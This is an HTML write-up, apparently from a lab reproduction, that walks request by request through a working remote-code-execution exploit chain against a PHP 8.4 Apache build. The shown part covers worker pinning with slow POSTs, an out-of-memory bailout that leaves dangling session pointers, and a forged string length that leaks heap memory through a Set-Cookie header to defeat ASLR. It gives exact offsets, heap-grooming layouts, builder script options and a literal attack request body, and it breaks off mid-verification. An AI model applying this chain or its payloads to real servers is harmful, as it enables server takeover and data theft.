@@ -1,0 +1,931 @@
+<title>PHP2Shell Request Map</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+  /* Layout: single reading column; sticky slim header; the exploit's five
+     requests as per-step cards (data → from/to → processor → mem state → bug),
+     each with gdb-verified evidence; diagrams as figures. */
+  :root {
+    --bg: #f7f5f0; --surface: #ffffff; --surface-2: #f1efe8;
+    --fg: #1f1e1c; --muted: #5f5e5a; --border: #d9d7cf; --border-strong: #b4b2a9;
+    --accent: #185FA5; --fault: #A32D2D; --warn: #854F0B; --ok: #3B6D11;
+    --diagram-bg: #ffffff;
+    --mono: "IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, monospace;
+    --sans: "IBM Plex Sans", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #1b1a16; --surface: #26251f; --surface-2: #211f1a;
+      --fg: #edece4; --muted: #b4b2a9; --border: #3a382f; --border-strong: #5f5e5a;
+      --accent: #85B7EB; --fault: #F09595; --warn: #EF9F27; --ok: #97C459;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #1b1a16; --surface: #26251f; --surface-2: #211f1a;
+    --fg: #edece4; --muted: #b4b2a9; --border: #3a382f; --border-strong: #5f5e5a;
+    --accent: #85B7EB; --fault: #F09595; --warn: #EF9F27; --ok: #97C459;
+    color-scheme: dark;
+  }
+  @media (prefers-color-scheme: dark) { :root { --diagram-bg: #26251f; } }
+
+  * { box-sizing: border-box; }
+  body { background: var(--bg); color: var(--fg); font-family: var(--sans); font-size: 16px; line-height: 1.62; margin: 0; -webkit-font-smoothing: antialiased; }
+  .wrap { max-width: 940px; margin: 0 auto; padding-left: max(18px, env(safe-area-inset-left, 0px)); padding-right: max(18px, env(safe-area-inset-right, 0px)); }
+  body::before { content: ""; position: fixed; inset: 0 0 auto; height: env(safe-area-inset-top, 0px); background: var(--surface); z-index: 20; }
+
+  header.bar { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 15; background: color-mix(in srgb, var(--surface) 92%, transparent); backdrop-filter: blur(8px); border-bottom: 1px solid var(--border); }
+  header.bar .wrap { display: flex; align-items: center; gap: 12px; padding-block: 11px; flex-wrap: wrap; }
+  header.bar .mark { font-family: var(--mono); font-weight: 600; font-size: 14px; letter-spacing: .02em; }
+  header.bar .mark b { color: var(--accent); }
+  header.bar .chips { display: flex; gap: 6px; margin-left: auto; flex-wrap: wrap; }
+  .chip { font-family: var(--mono); font-size: 11px; line-height: 1; letter-spacing: .02em; padding: 5px 8px; border-radius: 999px; border: 1px solid var(--border-strong); color: var(--muted); white-space: nowrap; }
+  .chip.fault { color: var(--fault); border-color: color-mix(in srgb, var(--fault) 55%, var(--border)); }
+  .chip.ok { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 55%, var(--border)); }
+
+  .hero { padding-block: 44px 20px; border-bottom: 1px solid var(--border); }
+  .eyebrow { font-family: var(--mono); font-size: 12px; letter-spacing: .14em; text-transform: uppercase; color: var(--accent); margin: 0 0 14px; }
+  h1 { font-size: clamp(30px, 6vw, 46px); line-height: 1.05; font-weight: 600; letter-spacing: -.02em; margin: 0 0 18px; text-wrap: balance; }
+  .lede { font-size: 19px; color: var(--muted); max-width: 46ch; margin: 0; }
+  .metaline { display: flex; flex-wrap: wrap; gap: 8px 22px; margin-top: 26px; font-family: var(--mono); font-size: 12.5px; color: var(--muted); }
+  .metaline b { color: var(--fg); font-weight: 600; }
+  .scope { margin: 26px 0 0; padding: 14px 16px; border-radius: 10px; border: 1px solid color-mix(in srgb, var(--warn) 45%, var(--border)); background: color-mix(in srgb, var(--warn) 9%, var(--surface)); font-size: 14px; }
+  .scope b { color: var(--warn); }
+
+  section { padding-block: 40px; border-bottom: 1px solid var(--border); }
+  .snum { font-family: var(--mono); font-size: 13px; color: var(--accent); letter-spacing: .06em; }
+  h2 { font-size: clamp(22px, 4vw, 30px); font-weight: 600; letter-spacing: -.015em; margin: 6px 0 14px; text-wrap: balance; }
+  h3 { font-size: 18px; font-weight: 600; margin: 28px 0 10px; }
+  p { margin: 0 0 14px; max-width: 74ch; }
+  p.narrow { max-width: 68ch; }
+  a { color: var(--accent); text-underline-offset: 2px; }
+  strong { font-weight: 600; }
+  code, .mono { font-family: var(--mono); font-size: .9em; }
+  :not(pre) > code { background: var(--surface-2); border: 1px solid var(--border); padding: .08em .36em; border-radius: 5px; white-space: nowrap; }
+  ul, ol { margin: 0 0 16px; padding-left: 20px; }
+  li { margin-bottom: 7px; max-width: 72ch; }
+
+  figure { margin: 22px 0 8px; }
+  .diagram { background: var(--diagram-bg); border: 1px solid var(--border-strong); border-radius: 12px; padding: 14px; overflow-x: auto; }
+  .diagram img { display: block; width: 100%; min-width: 540px; height: auto; }
+  figcaption { font-size: 13px; color: var(--muted); margin-top: 10px; }
+  figcaption b { color: var(--fg); font-weight: 600; font-family: var(--mono); font-size: 12px; }
+
+  .note { border-left: 3px solid var(--accent); background: var(--surface-2); padding: 12px 16px; border-radius: 0 8px 8px 0; margin: 18px 0; font-size: 14.5px; }
+  .note.fault { border-left-color: var(--fault); }
+  .note .lbl { font-family: var(--mono); font-size: 11px; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); display: block; margin-bottom: 4px; }
+
+  .tbox { overflow-x: auto; margin: 18px 0; border: 1px solid var(--border); border-radius: 10px; }
+  table { border-collapse: collapse; width: 100%; min-width: 560px; font-size: 13.5px; }
+  caption { text-align: left; font-size: 12.5px; color: var(--muted); padding: 10px 14px; border-bottom: 1px solid var(--border); background: var(--surface-2); font-family: var(--mono); }
+  th, td { text-align: left; padding: 9px 14px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  th { font-size: 11.5px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); font-weight: 600; background: var(--surface-2); }
+  tr:last-child td { border-bottom: none; }
+  td.mono, th.mono { font-family: var(--mono); font-size: 12.5px; }
+  td .sym { font-family: var(--mono); font-size: 12px; color: var(--accent); }
+  .src { font-family: var(--mono); font-size: 11.5px; color: var(--muted); white-space: nowrap; }
+  tbody tr:hover { background: color-mix(in srgb, var(--accent) 5%, transparent); }
+
+  pre { background: var(--surface-2); border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; overflow-x: auto; margin: 16px 0; font-size: 12.5px; line-height: 1.55; }
+  pre code { font-family: var(--mono); white-space: pre; background: none; border: none; padding: 0; }
+  .c-com { color: var(--muted); } .c-k { color: var(--accent); } .c-f { color: var(--fault); } .c-g { color: var(--ok); }
+
+  /* per-step cards */
+  .step { margin: 26px 0; border: 1px solid var(--border); border-radius: 14px; overflow: hidden; background: var(--surface); }
+  .step > .head { display: flex; align-items: center; gap: 12px; padding: 13px 16px; background: var(--surface-2); border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+  .step > .head h3 { margin: 0; font-size: 17px; }
+  .step > .head .verdict { margin-left: auto; font-family: var(--mono); font-size: 11.5px; color: var(--muted); }
+  .badge { font-family: var(--mono); font-size: 12px; font-weight: 600; padding: 4px 10px; border-radius: 7px; border: 1px solid var(--border-strong); white-space: nowrap; }
+  .badge.pin { color: var(--muted); }
+  .badge.fault { color: var(--fault); border-color: color-mix(in srgb, var(--fault) 50%, var(--border)); background: color-mix(in srgb, var(--fault) 8%, transparent); }
+  .badge.leak { color: var(--accent); border-color: color-mix(in srgb, var(--accent) 50%, var(--border)); background: color-mix(in srgb, var(--accent) 8%, transparent); }
+  .badge.exec { color: #fff; background: var(--fault); border-color: var(--fault); }
+  .step .inner { padding: 4px 16px 16px; }
+  dl.kv { display: grid; grid-template-columns: 136px 1fr; margin: 0; }
+  dl.kv > dt { font-family: var(--mono); font-size: 11px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); padding: 12px 10px 12px 0; border-top: 1px solid var(--border); }
+  dl.kv > dd { margin: 0; padding: 12px 0; border-top: 1px solid var(--border); min-width: 0; font-size: 14.5px; }
+  dl.kv > dt:first-of-type, dl.kv > dd:first-of-type { border-top: none; }
+  dl.kv code { font-size: 12.5px; }
+  @media (max-width: 560px) { dl.kv { grid-template-columns: 1fr; } dl.kv > dd { padding-top: 2px; } dl.kv > dt { border-top: 1px solid var(--border); padding-bottom: 2px; } dl.kv > dd { border-top: none; } }
+
+  .state { font-family: var(--mono); font-size: 12px; line-height: 1.5; background: var(--bg); border: 1px dashed var(--border-strong); border-radius: 8px; padding: 10px 12px; margin: 6px 0; overflow-x: auto; white-space: pre; color: var(--fg); }
+  .state .a { color: var(--accent); } .state .d { color: var(--fault); } .state .c { color: var(--muted); }
+
+  .verified { margin: 6px 0; border: 1px solid color-mix(in srgb, var(--ok) 50%, var(--border)); border-radius: 8px; overflow: hidden; }
+  .verified .vh { font-family: var(--mono); font-size: 11px; letter-spacing: .06em; text-transform: uppercase; color: var(--ok); background: color-mix(in srgb, var(--ok) 10%, var(--surface)); padding: 6px 12px; border-bottom: 1px solid color-mix(in srgb, var(--ok) 35%, var(--border)); }
+  .verified pre { margin: 0; border: none; border-radius: 0; background: var(--bg); font-size: 12px; }
+  .verified .k { color: var(--ok); } .verified .big { color: var(--fault); font-weight: 600; }
+
+  .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 18px 0; }
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; min-width: 0; }
+  .card.fault { border-left: 3px solid var(--fault); } .card.ok { border-left: 3px solid var(--ok); }
+  .card h4 { margin: 0 0 8px; font-size: 14px; } .card .lbl { font-family: var(--mono); font-size: 11px; letter-spacing: .06em; text-transform: uppercase; }
+  .card.fault .lbl { color: var(--fault); } .card.ok .lbl { color: var(--ok); }
+  @media (max-width: 620px) { .cols { grid-template-columns: 1fr; } }
+
+  .tiles { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin: 18px 0; }
+  .tile { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 14px; }
+  .tile .k { font-family: var(--mono); font-size: 11px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
+  .tile .v { font-size: 25px; font-weight: 600; letter-spacing: -.02em; font-variant-numeric: tabular-nums; margin-top: 4px; }
+  .tile .s { font-size: 12.5px; color: var(--muted); margin-top: 2px; }
+  .tile.good .v { color: var(--ok); }
+
+  footer { padding-block: 34px 48px; color: var(--muted); font-size: 13px; }
+  footer a { color: var(--accent); }
+  .refs { columns: 2; column-gap: 28px; font-size: 13px; } .refs li { break-inside: avoid; }
+  @media (max-width: 560px) { .refs { columns: 1; } }
+  .kicker { font-family: var(--mono); font-size: 12px; color: var(--muted); margin: 0 0 4px; letter-spacing: .04em; }
+
+  /* legend + stage diagrams */
+  .legend { display: flex; flex-wrap: wrap; gap: 8px 16px; font-family: var(--mono); font-size: 12px; color: var(--muted); margin: 16px 0; }
+  .legend span { display: inline-flex; align-items: center; }
+  .legend i { display: inline-block; width: 16px; height: 11px; margin-right: 6px; border-radius: 2px; border: 1px solid var(--border-strong); }
+  .lg-alloc { background: color-mix(in srgb, var(--ok) 35%, transparent); border-color: var(--ok); }
+  .lg-free { background: color-mix(in srgb, var(--muted) 28%, transparent); }
+  .lg-dangle { background: transparent; border-color: var(--fault); border-style: dashed; }
+  .lg-reclaim { background: color-mix(in srgb, var(--fault) 30%, transparent); border-color: var(--fault); }
+  .lg-read { background: transparent; border-color: var(--accent); }
+  .lg-oom { background: color-mix(in srgb, var(--warn) 42%, transparent); border-color: var(--warn); }
+  .sd { width: 100%; height: auto; display: block; min-width: 600px; }
+  .sd text { font-family: var(--mono); fill: var(--fg); }
+  .sd .s { font-size: 10px; fill: var(--muted); }
+  .sd .n { font-size: 11px; }
+  .sd .ca { fill: var(--accent); } .sd .cd { fill: var(--fault); } .sd .cg { fill: var(--ok); } .sd .cw { fill: var(--warn); } .sd .cm { fill: var(--muted); }
+  .sd .box { fill: var(--surface-2); stroke: var(--border-strong); }
+  .sd .ba { fill: var(--surface-2); stroke: var(--accent); }
+  .sd .bd { fill: color-mix(in srgb, var(--fault) 8%, var(--surface-2)); stroke: var(--fault); }
+  .sd .bg2 { fill: none; stroke: var(--ok); stroke-dasharray: 4 3; }
+  .sd .lane { fill: none; stroke: var(--border); }
+  .sd .arr { stroke: var(--muted); stroke-width: 1.5; fill: none; }
+  .sd .arrd { stroke: var(--fault); stroke-width: 1.5; fill: none; stroke-dasharray: 5 3; }
+  .sd .arra { stroke: var(--accent); stroke-width: 1.5; fill: none; }
+  .sd .arrr { stroke: var(--fault); stroke-width: 1.5; fill: none; }
+  .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 16px 0; }
+  .gallery figure { margin: 0; }
+  @media (max-width: 620px) { .gallery { grid-template-columns: 1fr; } }
+</style>
+
+<header class="bar">
+  <div class="wrap">
+    <span class="mark">php2shell · <b>request map</b></span>
+    <span class="chips">
+      <span class="chip fault">CVE-2026-109618</span>
+      <span class="chip fault">CVE-2026-109619</span>
+      <span class="chip ok">gdb-verified</span>
+    </span>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="hero">
+    <p class="eyebrow">Working exploit · step by step · self-verified</p>
+    <h1>PHP2Shell, request by request</h1>
+    <p class="lede">The five requests our exploit sends, and for each one: which bytes travel from where to where, which component processes them, the resulting process and heap state, and the bug that state depends on. The core mechanism is verified first-hand in gdb, not taken on trust.</p>
+    <div class="metaline">
+      <span>Target <b>php:8.4.26-apache</b> · prefork mod_php</span>
+      <span>Exploit <b>our fork of 9bie's PoC</b></span>
+      <span>Grounding <b>php-8.4.26 source + live gdb</b></span>
+    </div>
+    <div class="scope">
+      <b>Scope.</b> Authorized lab reproduction on a loopback-only container. The PoC is a complete working exploit; this report documents what it does and proves the key steps against the running process. Offsets are for this exact build. The one thing not spelled out is how to recalibrate those offsets for a different PHP build.
+    </div>
+  </div>
+
+  <!-- ===== 00 at a glance ===== -->
+  <section>
+    <p class="snum">00 — The chain</p>
+    <h2>Five requests, one worker</h2>
+    <p>The exploit is four chain requests — <strong>A1 → B1 → A2 → B2</strong> — preceded by a pinning step that forces all four onto the <em>same</em> Apache child. One worker is the whole point: the bug is that request-owned state (a module global, freed heap) survives from one request into the next <em>on the same process</em>, so every stage below shares that worker's heap and session globals.</p>
+    <div class="tbox">
+      <table>
+        <caption>the five requests our exploit.py sends</caption>
+        <thead><tr><th>Stage</th><th>Request</th><th>Builder</th><th>Does</th><th>Bug</th></tr></thead>
+        <tbody>
+          <tr><td class="mono pin">0 · pin</td><td class="mono">N−1 × slow POST</td><td class="mono">hold_workers / autopin</td><td>occupy every child but one</td><td class="mono">(enables reuse)</td></tr>
+          <tr><td class="mono" style="color:var(--fault)">A1 · OOM</td><td class="mono">multipart, chunked</td><td class="mono">mk_a1.py</td><td>OOM mid-cleanup → strand session globals</td><td class="mono">…618→…619</td></tr>
+          <tr><td class="mono" style="color:var(--accent)">B1 · leak</td><td class="mono">multipart, chunked</td><td class="mono">mk_leak_b.py</td><td>forged-length read → 800KB out via Set-Cookie</td><td class="mono">…619</td></tr>
+          <tr><td class="mono" style="color:var(--fault)">A2 · OOM</td><td class="mono">multipart</td><td class="mono">cheap_oom_a.py</td><td>OOM → strand a second heap pointer</td><td class="mono">…618</td></tr>
+          <tr><td class="mono" style="color:#fff;background:var(--fault);border-radius:5px;padding:1px 6px">B2 · exec</td><td class="mono">multipart</td><td class="mono">fake_ref_b + mk_ht</td><td>reclaim with fake array → <code>system()</code></td><td class="mono">…618+UAF</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="note">
+      <span class="lbl">How to read each stage</span>
+      <strong>Data</strong> = the bytes the builder emits · <strong>From → to</strong> = where that data travels · <strong>Processed by</strong> = the component + source line · <strong>Process / mem state</strong> = what the worker holds afterward (addresses from one gdb run) · <strong>Bug</strong> = the invariant it breaks. Green panels are things I confirmed live in gdb.
+    </div>
+  </section>
+
+  <!-- ===== Stage 0 pin ===== -->
+  <section>
+    <p class="snum">01 — Stage 0</p>
+    <h2>Pinning: force one worker</h2>
+    <div class="step">
+      <div class="head"><span class="badge pin">PIN</span><h3>Occupy every child but one</h3><span class="verdict">makes …619 reachable</span></div>
+      <div class="inner">
+        <dl class="kv">
+          <dt>Data</dt><dd><code>N−1</code> connections, each a <code>POST /index.php</code> with <code>Content-Length: 1048576</code> but only one body byte sent.</dd>
+          <dt>From → to</dt><dd>attacker sockets → Apache's accept loop; each parked connection holds one prefork child blocked reading the body.</dd>
+          <dt>Processed by</dt><dd>Apache <span class="sym">mpm_prefork</span> (child concurrency cap) and <span class="sym">mod_reqtimeout</span> (<code>body=10,minrate=500</code>).</dd>
+          <dt>Process / mem state</dt><dd>Of the target's <code>MaxRequestWorkers</code> children, <code>N−1</code> are busy; exactly one is free. A1/B1/A2/B2 then serialize onto that one child, so its heap and <code>ps_globals</code> persist across all four.</dd>
+          <dt>Bug</dt><dd>No bug here — this is setup. It exists only because <strong>…619 is cross-request on one persistent child</strong>; scatter the four requests and the dangling pointers never line up.</dd>
+        </dl>
+        <div class="note"><span class="lbl">our fork</span><code>--workers auto</code> discovers N over HTTP (a fresh request is served only if a child is free), and a keepalive thread drip-feeds ~1.3&nbsp;KB/s per holder to beat <code>mod_reqtimeout</code>. See §09.</div>
+      </div>
+    </div>
+    <div class="legend" aria-label="diagram legend">
+      <span><i class="lg-alloc"></i>allocate</span>
+      <span><i class="lg-free"></i>free</span>
+      <span><i class="lg-dangle"></i>dangling pointer</span>
+      <span><i class="lg-reclaim"></i>reclaim (attacker bytes)</span>
+      <span><i class="lg-read"></i>read / call</span>
+      <span><i class="lg-oom"></i>OOM longjmp</span>
+    </div>
+    <figure>
+      <div class="diagram">
+        <svg class="sd" viewBox="0 0 900 180" role="img" aria-label="The attacker holds N-1 prefork children busy with slow POSTs, leaving one free child that serves all four chain requests so its heap persists.">
+          <rect class="box" x="16" y="62" width="120" height="46" rx="6"/>
+          <text class="n" x="76" y="82" text-anchor="middle">attacker</text>
+          <text class="s" x="76" y="98" text-anchor="middle">one client</text>
+          <path class="arr" d="M136 85 H308"/><polygon class="cm" points="316,85 308,80 308,90"/>
+          <text class="s" x="150" y="76">N−1 slow POST (held open)</text>
+          <text class="s" x="150" y="104">+ A1·B1·A2·B2, warm GET</text>
+          <text class="s" x="330" y="44">prefork children · MaxRequestWorkers</text>
+          <rect class="box" x="330" y="52" width="120" height="30" rx="4"/><text class="s" x="390" y="71" text-anchor="middle">busy</text>
+          <rect class="box" x="462" y="52" width="120" height="30" rx="4"/><text class="s" x="522" y="71" text-anchor="middle">busy</text>
+          <rect class="box" x="594" y="52" width="120" height="30" rx="4"/><text class="s" x="654" y="71" text-anchor="middle">busy</text>
+          <rect class="box" x="726" y="52" width="120" height="30" rx="4"/><text class="s" x="786" y="71" text-anchor="middle">busy</text>
+          <rect class="box" x="330" y="90" width="120" height="30" rx="4"/><text class="s" x="390" y="109" text-anchor="middle">busy</text>
+          <rect class="box" x="462" y="90" width="120" height="30" rx="4"/><text class="s" x="522" y="109" text-anchor="middle">busy</text>
+          <rect class="box" x="594" y="90" width="120" height="30" rx="4"/><text class="s" x="654" y="109" text-anchor="middle">busy</text>
+          <rect class="ba" x="726" y="90" width="120" height="30" rx="4"/><text class="n ca" x="786" y="109" text-anchor="middle">FREE</text>
+          <text class="s cg" x="786" y="138" text-anchor="middle">serves A1·B1·A2·B2</text>
+          <text class="s cm" x="16" y="166">All four chain requests land on the one free child, so its ZendMM heap and session globals carry state from A1 → B1 → A2 → B2.</text>
+        </svg>
+      </div>
+      <figcaption><b>stage 0</b> · pinning: hold every child but one, so the chain shares a single worker's heap.</figcaption>
+    </figure>
+  </section>
+
+  <!-- ===== Stage A1 ===== -->
+  <section>
+    <p class="snum">02 — Stage A1</p>
+    <h2>A1 — OOM mid-cleanup strands the session globals</h2>
+    <div class="step">
+      <div class="head"><span class="badge fault">A1</span><h3>END-cleanup <code>send_cookie</code> OOM</h3><span class="verdict">CVE-2026-109618</span></div>
+      <div class="inner">
+        <dl class="kv">
+          <dt>Data</dt><dd><code>mk_a1.py</code>: a <code>PHPSESSID</code> field, 860 depth-64 nested empty-file fields, 14 fillers, 78 × 8000-byte values, 20 × 4000-byte burners, and <code>PHP_SESSION_UPLOAD_PROGRESS = 'k'×4000</code>. Sent <strong>chunked</strong>.</dd>
+          <dt>From → to</dt><dd>body → <code>chunked_send.py</code> → SAPI <code>read_post</code> → the multipart parser → per-part the upload-progress <em>callback</em> → the session subsystem, which opens a record and grows <code>progress-&gt;data</code> on the worker heap.</dd>
+          <dt>Processed by</dt><dd><span class="sym">rfc1867_post_handler</span> <span class="src">rfc1867.c:651</span> → <span class="sym">php_session_rfc1867_callback</span> <span class="src">session.c:3221</span> → at <code>EVENT_END</code>, <span class="sym">php_session_rfc1867_update</span> → <span class="sym">php_session_initialize</span> → <span class="sym">php_session_reset_id</span> → <span class="sym">php_session_send_cookie</span> → <span class="sym">php_url_encode</span>, whose allocation crosses <code>memory_limit</code> → <span class="sym">zend_mm_safe_error</span> <span class="src">zend_alloc.c:401</span> → <code>longjmp</code>.</dd>
+          <dt>Process / mem state</dt><dd>The <code>longjmp</code> unwinds out of the END cleanup. The worker is left mid-teardown with session state not fully reset:
+            <div class="state"><span class="c"># after A1, on the pinned worker (one gdb instance):</span>
+PS(send_cookie) = <span class="d">1</span>        <span class="c"># next request will re-send a cookie</span>
+PS(id)       → <span class="a">id_chunk+0x137000</span>  <span class="d">(dangling)</span>
+PS(mod_data) → <span class="a">main+0x560a0</span>       <span class="d">(dangling, page 0x56)</span>
+basedir      → real "/tmp" string pointer</div></dd>
+          <dt>Bug</dt><dd><strong>CVE-2026-109618.</strong> The OOM <code>longjmp</code> aborts the request mid-operation; the session globals that normally get cleared are left pointing at memory the request arena is about to free. Those stale pointers are the input to B1.</dd>
+        </dl>
+        <div class="verified">
+          <div class="vh">verified in gdb — breakpoints on php_url_encode &amp; longjmp</div>
+          <pre><code><span class="k">[reset_id]</span> entered
+<span class="k">[url_encode]</span> len=0x20 (32)  data@0x7f56d1337018 first=fd0a9543   <span class="c"># legit 32-byte id</span>
+<span class="k">[longjmp]</span> zend bailout (OOM/abort path)   <span class="c"># ×3 — the 109618 abort</span></code></pre>
+        </div>
+        <div class="note fault"><span class="lbl">why chunked</span>With <code>Transfer-Encoding: chunked</code> and no <code>Content-Length</code>, <code>SG(request_info).content_length = 0</code>, so the one size gate — <code>if (content_length &gt; post_max_size) return;</code> at <span class="src">rfc1867.c:697</span> — is skipped. The 8M <code>post_max_size</code> no longer bounds the body, so arbitrarily large bodies reach the parser for heap shaping.</div>
+      </div>
+    </div>
+    <figure>
+      <div class="diagram">
+        <svg class="sd" viewBox="0 0 900 300" role="img" aria-label="A1: a chunked multipart POST drives the heap to the memory limit; the cookie-encode allocation longjmps out, skipping the reset, so PS(id) and PS(mod_data) are left dangling into freed pages.">
+          <rect class="box" x="16" y="14" width="600" height="46" rx="6"/>
+          <text class="n" x="28" y="34">POST /index.php?q…  ·  chunked multipart</text>
+          <text class="s" x="28" y="50">860 depth-64 nested · 78×8000B values · PROGRESS=4000B   (chunked ⇒ no post_max_size limit)</text>
+          <text class="s" x="16" y="80">processed by:  read_post → rfc1867 parser → callback END → php_session_initialize → reset_id → send_cookie → php_url_encode</text>
+          <rect class="lane" x="16" y="94" width="868" height="152" rx="8"/>
+          <text class="s" x="28" y="112">worker heap (pinned child)</text>
+          <rect class="box" x="32" y="120" width="250" height="13"/>
+          <rect x="33" y="121" width="244" height="11" style="fill:var(--warn);opacity:.45"/>
+          <text class="s cw" x="32" y="148">real_size → memory_limit 128M</text>
+          <text class="n cw" x="300" y="146">✦ crosses limit → longjmp ×3  (skips the reset)</text>
+          <rect class="bd" x="600" y="116" width="268" height="34" rx="4"/>
+          <text class="n" x="612" y="132">id zend_string · bin-64</text>
+          <text class="s" x="612" y="146">@ id_chunk+0x137000</text>
+          <text x="852" y="140" style="font-size:18px;fill:var(--fault)">×</text>
+          <rect class="bd" x="600" y="162" width="268" height="34" rx="4"/>
+          <text class="n" x="612" y="178">ps_files · bin-40 = PS(mod_data)</text>
+          <text x="852" y="186" style="font-size:18px;fill:var(--fault)">×</text>
+          <rect class="ba" x="32" y="176" width="130" height="28" rx="4"/><text class="n" x="97" y="194" text-anchor="middle">PS(id)</text>
+          <rect class="box" x="32" y="210" width="130" height="28" rx="4"/><text class="n" x="97" y="228" text-anchor="middle">PS(mod_data)</text>
+          <rect class="box" x="176" y="210" width="150" height="28" rx="4"/><text class="n cd" x="251" y="228" text-anchor="middle">send_cookie=1</text>
+          <path class="arrd" d="M162 190 C 360 185, 470 133, 598 133"/><polygon class="cd" points="600,133 592,128 592,138"/>
+          <path class="arrd" d="M162 224 C 380 224, 470 179, 598 179"/><polygon class="cd" points="600,179 592,174 592,184"/>
+          <text class="s cm" x="16" y="268">longjmp skipped the reset · ZendMM reclaimed the pages (bytes remain) · the globals now dangle = the strand B1 reclaims.</text>
+        </svg>
+      </div>
+      <figcaption><b>stage A1</b> · the OOM <code>longjmp</code> strands <code>PS(id)</code> / <code>PS(mod_data)</code> into freed-but-reusable pages, with <code>send_cookie=1</code>.</figcaption>
+    </figure>
+    <h4 style="margin:24px 0 6px;font-size:14px;font-weight:600">A1 on the wire — real multipart body (<code>mk_a1.py --big 78</code>)</h4>
+    <pre><code>--CCCCCCCCCC
+Content-Disposition: form-data; name="PHPSESSID"
+
+\x00                               <span class="c-com"># sid value = 1 NUL byte</span>
+--CCCCCCCCCC
+Content-Disposition: form-data; name="files[R00000KK…KK][a]×62"; filename="A"
+Content-Type: CCC…CCC (103 B)      <span class="c-com"># depth-64 nested name · ×860 parts</span>
+
+                                   <span class="c-com"># empty file body</span>
+--CCCCCCCCCC
+Content-Disposition: form-data; name="b0000"
+
+BBBB…BBBB (8000 B)                 <span class="c-f"># ×78 → drives real_size toward 128M</span>
+--CCCCCCCCCC
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+kkkk…kkkk (4000 B)                 <span class="c-com"># last-page consumer before the OOM</span>
+--CCCCCCCCCC--</code></pre>
+    <p style="font-size:12.5px;color:var(--muted);margin-top:-6px">Full body: <strong>1,060,211 bytes, 974 parts</strong>. Sent with <code>Transfer-Encoding: chunked</code> so <code>content_length=0</code> and the 8M <code>post_max_size</code> gate is skipped.</p>
+  </section>
+
+  <!-- ===== Stage B1 ===== -->
+  <section>
+    <p class="snum">03 — Stage B1</p>
+    <h2>B1 — a forged length turns the cookie into an 800KB leak</h2>
+    <div class="step">
+      <div class="head"><span class="badge leak">B1</span><h3>stale-id out-of-bounds read</h3><span class="verdict">CVE-2026-109619 · ASLR defeat</span></div>
+      <div class="inner">
+        <dl class="kv">
+          <dt>Data</dt><dd><code>mk_leak_b.py --spec "G:511:0x137"×14, "G:400:0x137", "G:511:0x137", "X:900" --fake-len 0xC8000</code>. Each <code>G</code> value is a full 2&nbsp;MiB-chunk fill of <code>'A'</code> with a <strong>forged <code>zend_string</code> header</strong> written at page <code>0x137</code>; <code>X:900</code> are 900 real nested arrays.</dd>
+          <dt>From → to</dt><dd>the <code>G</code> field values are allocated on the worker heap and <strong>reclaim the exact chunk pages the stale <code>PS(id)</code> (from A1) points into</strong>. So <code>PS(id)</code> now overlays attacker bytes: a fake <code>zend_string</code> with <code>len=0xC8000</code> and data starting <code>'/'</code>. When the cookie is sent, those bytes stream back out to the client.</dd>
+          <dt>Processed by</dt><dd><span class="sym">php_session_initialize</span>: <code>s_open</code> takes a fresh slot; <code>PS(id)</code> is non-null with a non-zero first byte, so it is treated as an existing id (<code>use_strict_mode=0</code> skips validation) → <span class="sym">php_session_reset_id</span> <span class="src">:1563</span> → <span class="sym">php_session_send_cookie</span> → <code>e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)))</code> <span class="src">session.c:1447</span>. <code>ZSTR_LEN</code> is the forged <code>0xC8000</code>, so it reads 800KB past the real object. Then <code>s_read</code>'s <span class="sym">php_session_valid_key</span> <span class="src">:359</span> rejects the <code>'/'</code> → <code>php_session_abort</code>; RSHUTDOWN tries to release <code>PS(id)</code> but the forged <code>refcount=0</code> decrements to <code>0xFFFFFFFF</code> and is not freed; the page's <code>echo "OK"</code> completes → <strong>200 + the giant Set-Cookie</strong>.</dd>
+          <dt>Process / mem state</dt><dd>The read window spans the id chunk and the neighbouring holes:
+            <div class="state"><span class="c"># id chunk, 2 MiB, groomed by the G/X fields:</span>
+pages 1..400   <span class="a">'A' fill</span>            <span class="c"># G:400 stops here, leaving...</span>
+pages 0x191..0x1ff  <span class="a">111-page hole</span>   <span class="c"># X:900 real HashTables land in it</span>
+                                    <span class="c"># their pDestructor = zval_ptr_dtor (a libphp ptr)</span>
+read starts @ chunk+0x137018, len 0xC8000 -> covers up to page 0x1f7</div></dd>
+          <dt>Output → client</dt><dd><code>decode_cookie.py</code> url-decodes the 819,208-byte cookie and clusters the 8-byte heap pointers by 2&nbsp;MiB alignment: the biggest cluster is the <strong>id-chunk base</strong>; the most common single pointer is <code>zval_ptr_dtor</code> → <strong><code>libphp = ptr − 0x65EB60</code></strong>; a count-87 cluster is the <strong>main chunk</strong>. A <code>libphp − main</code> sanity band (<code>0x1A00000…0x1F00000</code>) rejects a bad leak and retries.</dd>
+          <dt>Bug</dt><dd><strong>CVE-2026-109619.</strong> The stale <code>PS(id)</code> that survived A1 (a request-owned global outliving its backing memory) is re-read in a later request; with its length field under attacker control, the read is an arbitrary-size info leak that defeats ASLR.</dd>
+        </dl>
+        <div class="verified">
+          <div class="vh">verified in gdb — the keystone</div>
